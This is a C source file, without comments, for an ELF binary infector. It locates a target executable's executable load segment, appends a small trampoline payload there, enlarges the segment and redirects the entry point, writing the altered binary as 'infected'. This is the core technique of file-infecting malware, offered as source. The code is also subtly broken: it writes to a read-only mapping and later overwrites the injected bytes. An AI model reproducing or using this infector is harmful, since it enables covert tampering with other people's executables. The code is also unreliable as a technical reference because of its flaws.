#include <elf.h>
#include <fcntl.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <unistd.h>
#include <string.h>
#include <stdio.h>

unsigned char payload[] = {
        0x48, 0xb8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0xff, 0xe0
    };

int main(int argc, char **argv)
{
    int fd = open(argv[1], O_RDONLY);
    struct stat st;
    fstat(fd, &st);

    void *map = mmap(NULL, st.st_size, PROT_READ, MAP_PRIVATE, fd, 0);
    Elf64_Ehdr *eh = map;
    Elf64_Phdr *ph = map + eh->e_phoff;

    Elf64_Addr original_entry = eh->e_entry;

    int exec_idx = -1;
    for (int i = 0; i < eh->e_phnum; i++) {
        if (ph[i].p_type == PT_LOAD && (ph[i].p_flags & PF_X)) {
            exec_idx = i;
            break;
        }
    }

    if (exec_idx == -1)
        return 1;

    Elf64_Phdr *exec = &ph[exec_idx];

    size_t payload_size = sizeof(payload);
    Elf64_Off inject_off = exec->p_offset + exec->p_filesz;
    Elf64_Addr inject_vaddr = exec->p_vaddr + exec->p_filesz;

    *(Elf64_Addr *)(payload + 2) = original_entry;

    int out = open("infected", O_CREAT | O_WRONLY | O_TRUNC, 0755);
    write(out, map, st.st_size);

    lseek(out, inject_off, SEEK_SET);
    write(out, payload, payload_size);

    exec->p_filesz += payload_size;
    exec->p_memsz += payload_size;
    eh->e_entry = inject_vaddr;

    lseek(out, 0, SEEK_SET);
    write(out, map, st.st_size);

    close(out);
    munmap(map, st.st_size);
    close(fd);
}